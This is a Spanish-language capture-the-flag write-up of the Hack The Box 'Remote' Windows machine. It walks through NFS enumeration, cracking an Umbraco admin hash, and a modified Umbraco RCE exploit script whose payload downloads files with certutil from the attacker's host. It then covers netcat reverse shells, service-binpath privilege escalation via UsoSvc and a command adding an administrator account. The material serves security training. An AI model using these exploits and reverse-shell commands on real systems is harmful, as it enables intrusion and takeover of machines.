---
title: HTB-REMOTE
author: Christian Gutierrez
date: 2020-11-20 14:10:00 -0500
categories: [HackTheBox, Medium]
tags: [HTB, SSH, NodeJS]
image: /assets/htb/02_remote/portada.PNG
---
## Decripción del entorno
### <span style="color:green">Atacante</span>

| OS          | Kali Linux          |
| IP          | 10.10.14.45         |

### <span style="color:green">Maquina Objetivo</span>

| OS          | Windows             |
| IP          | 10.10.10.180        |
| Dificultad  | 4.7/10 / **Medium** |
| URL         | [**Remote**](https://www.hackthebox.eu/home/machines/profile/234)    |

## Enumeración
Se realiza la enumeración habitual para el reconocimiento e identificación de los puertos abiertos en el sistema: 
```console
$ nmap -sS -sV -sC -oN nmap_remote 10.10.10.180
```
![Escaneo con Nmap](assets/htb/02_remote/01_escaneo_nmap.png)
_Resultado escaneo con nmap_

En el puerto 80 se detecta un servicio web en el cual se identifican 2 directorios interesantes: 
- /umbraco/
- /umbraco/webservices/codeEditorSave.asmx

![Puerto 80](assets/htb/02_remote/02_puerto_80.png)
_Pagina Web desplegada en el puerto 80_

En este punto nos percatamos en 2 servicios interesantes, los cuales son el **FTP (21)** y el **RPC (Remote Procedure Call – 111, 2049)**, por lo cual procedemos a verificarlos: 

### FTP
    - anonymous:anonymous
El FTP tiene habilitado el acceso anónimo, pero este no revela ninguna información, así que nos centramos en los otros puertos. 

### RCP

> El RPC es un protocolo de computación distribuida que permite ejecutar llamados y acciones sobre otro equipo sin preocuparse en el canal o la comunicación entre los mismos, algo así como un SOCKET a nivel de sistema operativo. Un ejemplo claro de este protocolo lo vemos en las actualizaciones de Windows, en el que nuestro equipo se comunica al servidor principal, y en caso de existir actualizaciones, crea un canal **RPC** a nuestro equipo y ejecuta los comandos y acciones necesarias para aplicar las actualizaciones. 
> - Si bien el RPC es un protocolo, actualmente esta muy extendido en el uso de aplicaciones cliente – servidor, facilitando notoriamente la interacción sin tener que configurar los canales de comunicación. Es por esto que también se han implementado otro tipo de tecnologías directamente sobre el protocolo, en este caso, es posible montar un sistema de ficheros en red **NFS (Network File System)** y de esta manera compartir información y archivos con otros equipos en la red. 

Recordemos que el sistema **NFS** monta sistema de archivos en red que permite que otros equipos interactúen con ese sistema de archivos de forma remota, casi como si los tuvieran montados de manera local. Por todo lo anterior, teniendo habilitado un puerto **RPC** vamos a verificar los procesos y servicios que tiene en ejecución: 

```console
$ rpcinfo -p 10.10.10.180
```
![RCPINFO](assets/htb/02_remote/03_rcpinfo.png)
_Validación del protocolo RPC_

El comando anterior nos muestra la versión que se esta utilizando, el puerto en el que corre y el servicio que soporta, así pues, confirmamos que existe un servicio **NFS** enejcutandose en el protocolo **RPC**, por el puerto **2049**: 

```console
$ showmount -e 10.10.10.180
```

![ShowMount](assets/htb/02_remote/04_showmount.png)
_Verificación del sistema de archivos NFS por ShowMount_

Con el comando showmount podemos verificar qué sistemas de archivos se encuentran disponibles en un servicio **NFS** remoto. En este caso encontramos `/site_backups` que tiene permisos **(everyone)**, lo que nos permite montarlo y accederlo sin credenciales: 

```console
$ mount -t nfs 10.10.10.180:/site_backups tmp/ -o nolock
```

En nuestro sistema vamos a montar como una “partición” el recurso **NFS** de `/site_backups`, esto lo hacemos con el comando `mount` indicándole el tipo de sistema de archivos `-t nfs` y asignándole una ruta local en la cual montar el contenido `tmp/`. Adicionalmente la opción `-o nolock` permite a las aplicaciones bloquear los archivos, pero solo de forma local, por ejemplo, para accederlos mediante un editor. 

![moun site_backups](assets/htb/02_remote/05_mount_site_backups.png)
_Montaje de la particion NFS siteBackups con nuestro equipo atacante_

Lo primero que hacemos es descargarnos el archivo `Web.config` del directorio principal para poder verificar si hay credenciales en texto claro, pero no es así: 

![moun site_backups](assets/htb/02_remote/06_umbraco_sdf.png)
_Revision archivo Web.Config_

Sin embargo, encontramos una cadena de conexión a una base de datos local que se almacena como archivo, llamado `Umbraco.sdf`

- Nota: 
> Se intenta realizar la búsqueda mediante expresiones regulares de términos referentes a **password**, pero son una gran cantidad de archivos y al ser un **volumen NFS** en un equipo externo por medio de una VPN (hack the box), es demasiado lento y la conexión se cae continuamente, por lo que después de eso, se siguió la pista del `Umbraco.sdf`

Investigando un poco en internet, se llega a que dicho archivo se almacena en la siguiente ruta: 

- `/App_Data/Umbraco.sdf`
![File Umbraco](assets/htb/02_remote/07_head_umbraco_sdf.png)
_Revision de Umbraco.sdf_

A primera vista del archivo, se encuentra una posible credencial para el usuario admin de la plataforma, dicha credencial se encuentra cifrada en **SHA1**:

- Administrator
- Admin
- admin@htb.local
- b8be16afba8c314ad33d812f22a04991b90e2aaa

Procedemos a realizar un ataque de diccionario utilizando la herramienta **John The Ripper** con el diccionario **rockyou.txt**:

```console
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash_admin
```

![John The Ripper](assets/htb/02_remote/08_john_the_ripper.png)
_Ataque por diccionario con John The Ripper_

Lo cual nos arroja como contraseña, las siguientes credenciales: 
- admin@htb.local:**baconandcheese**
Estas credenciales nos dan acceso al panel de administración: 

![Panel Umbraco](assets/htb/02_remote/09_umbraco_panel_administracion.png)
_Panel de Administración Umbraco_

Con searchexploit encontramos un exploit que requiere de autenticación para obtener una ejecución remota de comandos en sistemas umbraco:

```console
$ searchsploit Umbraco
```
![Searchsploit](assets/htb/02_remote/10_searchsploit_umbraco.png)
_Busqueda de exploit's para el software Umbraco_

Inicialmente tenemos identificado el exploit [Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution](https://www.exploit-db.com/exploits/46153):
- exploits/aspx/webapps/46153.py

## Explotación

Así que le realizamos algunos cambios para que pueda funcionar de forma adecuada, agregamos el target y el payload que queremos: 
- Login: admin@htb.local
- Password: baconandcheese
- Host: http://10.10.10.180

```python
# Exploit Title: Umbraco CMS - Remote Code Execution by authenticated administrators
# Dork: N/A
# Date: 2019-01-13
# Exploit Author: Gregory DRAPERI & Hugo BOUTINON
# Vendor Homepage: http://www.umbraco.com/
# Software Link: https://our.umbraco.com/download/releases
# Version: 7.12.4
# Category: Webapps
# Tested on: Windows IIS
# CVE: N/A


import requests;

from bs4 import BeautifulSoup;

def print_dict(dico):
    print(dico.items());
    
print("Start");

# Execute a calc for the PoC
payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
{ string cmd = "/c certutil.exe -urlcache -f http://10.10.14.45/d14.ps1 C:\\site_backups\\d14.ps1"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = cmd;\
 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
 </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
 </xsl:template> </xsl:stylesheet> ';

login = "admin@htb.local";
password="baconandcheese";
host = "http://10.10.10.180";

# Step 1 - Get Main page
s = requests.session()
url_main =host+"/umbraco/";
r1 = s.get(url_main);
print_dict(r1.cookies);

# Step 2 - Process Login
url_login = host+"/umbraco/backoffice/UmbracoApi/Authentication/PostLogin";
loginfo = {"username":login,"password":password};
r2 = s.post(url_login,json=loginfo);

# Step 3 - Go to vulnerable web page
url_xslt = host+"/umbraco/developer/Xslt/xsltVisualize.aspx";
r3 = s.get(url_xslt);

soup = BeautifulSoup(r3.text, 'html.parser');
VIEWSTATE = soup.find(id="__VIEWSTATE")['value'];
VIEWSTATEGENERATOR = soup.find(id="__VIEWSTATEGENERATOR")['value'];
UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN'];
headers = {'UMB-XSRF-TOKEN':UMBXSRFTOKEN};
data = {"__EVENTTARGET":"","__EVENTARGUMENT":"","__VIEWSTATE":VIEWSTATE,"__VIEWSTATEGENERATOR":VIEWSTATEGENERATOR,"ctl00$body$xsltSelection":payload,"ctl00$body$contentPicker$ContentIdValue":"","ctl00$body$visualizeDo":"Visualize+XSLT"};

# Step 4 - Launch the attack
r4 = s.post(url_xslt,data=data,headers=headers);
print r4.text
print("End");
```

Analizando el payload que tiene el exploit, vemos que realiza la ejecución directa del ejecutable calc.exe mediante el llamado de funcionalidades en C#, todo esto, embebido en la estructura XSLT. Entrando más en detalle con el exploit vemos lo siguiente: 

1. Crea una sesión con requests (librería de Python) y realiza 4 peticiones al servidor, en este orden:
    - [GET] Visita la página principal para ver si el host está disponible
    - [POST] Realiza el proceso de login con las credenciales proporcionadas
    - [GET] Visita directamente la funcionalidad vulnerable, para capturar las cookies y los datos para saltar el anti CSRF:
    - /umbraco/developer/Xslt/xsltVisualize.aspx 
    - [POST] Por último, con los datos recopilados realiza la petición de explotación, la cual incluye el payload en el parámetro: ctl00$body$xsltSelection todo lo demás, viene de la petición anterior.

2. El payload consiste en una webshell básica en C#, la cual puede retornar un valor visual conforme al comando ingresado, y depende de 2 valores: 
- FileName => Este será el ejecutable a llamar por sistema operativo
- CMD => Estos serán los argumentos pasados al ejecutable seleccionado. 

Con todo lo anterior, podemos comprobar que al ingresar los siguientes valores en el payload, obtenemos un resultado de ejecución remota de comandos:
- FileName = “cmd.exe”
- Cmd: “/c whoami”
Como respuesta a la petición obtenemos la información del comando ejecutado. 
![Test Exploit](assets/htb/02_remote/11_test_exploit.png)
_Prueba manual del exploit_

- Nota
> Al ser un sistema Windows, lo primero que intentamos es realizar el consumo de un ejecutable (Shell reversa construida con msfvenom) de forma remota mediante SMB hacia nuestro servidor (consideramos que la Shell esta en C# y hay que escapar la barra invertida), quedando así: \\\\10.10.14.45\\share\\d14.exe, sin embargo, no obtenemos resultado debido a que es un sistema Windows 10 actualizado, y por defecto en las nuevas actualizaciones, Windows no esta aceptando el consumo de recursos SMB sin contraseña y deshabilito el SMBv2   (https://github.com/SecureAuthCorp/impacket/issues/599). 

En este punto, intentamos ejecutar una Shell reversa con netcat, pero parece que por problemas con los caracteres de escape no funcionará, así que se decide no hacerlo de forma directa sino transferir al servidor el archivo y después ejecutarlo:

```console
$ cmd.exe /c certutil.exe -urlcache -f http://10.10.14.45/d14.ps1 C:\\site_backups\\nc.exe
```
Antes de eso, creamos el servidor HTTP y colocamos ahí nuestro ejecutable de netcat:

```console
$ python -m SimpleHTTPServer 80
```

Ahora que la Shell se encuentra en el servidor, la ejecutamos desde el exploit y recibimos la conexión a nuestro puerto 4646 con netcat

```console
$ nc -nvlp 4646
$ nc.exe 10.10.14.45 4646 -e cmd.exe
```

Lo cual nos proporciona una Shell interactiva con el servidor victima y podemos capturar la flag de bajos privilegios

![Reverse Shell](/assets/htb/02_remote/12_user_txt.png)
_Reverse Shell con usuario de bajos privilegios_

## Elevación de privilegios

Procedemos a subir el archivo PowerUp de powershell, que nos permitirá testear de forma automática diferentes vectores de escala de privilegios en sistemas Windows y obtenemos los siguientes resultados: 

![PowerUp](/assets/htb/02_remote/13_powerup.png)
_PowerUp Windows_

Como se puede observar, hay un hallazgo con el servicio UsoSvc, el cual no tiene adecuadamente configurado los permisos, así que después de mucho intentar, nos decantamos por esta posibilidad:

- <https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/>

Investigando un poco, se descubre que dicho servicio posee una vulnerabilidad reciente de escala de privilegios, la cual afecta a sistemas Windows 10 y viene vulnerable desde fábrica. 

La vulnerabilidad consiste puntualmente en el abuso de permisos en un servicio, en este caso, un servicio propio de Windows. Por lo que podemos con los privilegios actuales, alterar la ruta del ejecutable del servicio e incrustar cualquier comando o acción. La explotación se puede realizar 2 maneras, una automática utilizando la funcionalidad Invoke-ServiceAbuse de PowerUp ó de forma manual, realizando la configuración y alterando la ruta.

- PowerUp
```console
$ Powershell -nop -exec bypass -c “Import-Module ./PowerUp.ps1; Invoke-ServiceAbuse -ServiceName UsoSvc”
```
- Manual
```console
> sc.exe stop UsoSvc
> sc.exe config UsoSvc binpath=”C:\Users\public\nc.exe 10.10.14.45 4545 -e cmd.exe”
> sc.exe start UsoSvc
```

Se podría decir que ambas maneras son lo mismo, pues la función de PowerUp realiza la parte manual, solamente que altera el comando a inyectar, creando un usuario y agregándolo al grupo de administrators:

```console
> net user john Password123! && net localgroup administrators john /add”
```

En ambos casos la lógica es la misma, se detiene el servicio, se altera la ruta del binario o del comando a ejecutar, y como el servicio esta configurado para ejecutarse con privilegios de SYSTEM, al reiniciarlo ejecutará nuestros comandos con ese nivel de privilegios, permitiéndonos de esta manera la escala de privilegios. 

![Elevación de Privilegios](/assets/htb/02_remote/14_elevacion_privilegios.png)
_Elevación de Privilegios_

Al final se obtuvo la conexión reversa con este nuevo nivel de privilegios y se logra la captura del flag. 

Bytez ;)

## Referencia
1. <https://recipeforroot.com/runas/>
    - Script para ejecutar un RunAS con powershell, utilizando credenciales de algún usuario
2. <https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS>
    - Proyecto de búsqueda y enumeración de vectores para escala de privilegios en Windows, tiene un .exe y .bat
3. <https://book.hacktricks.xyz/shells/windows>
    - o	Un blog bastante interesante, con trucos e información de seguridad. 
4. <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources>
    - EXCELENTE MATERIAL DE ESTUDIO!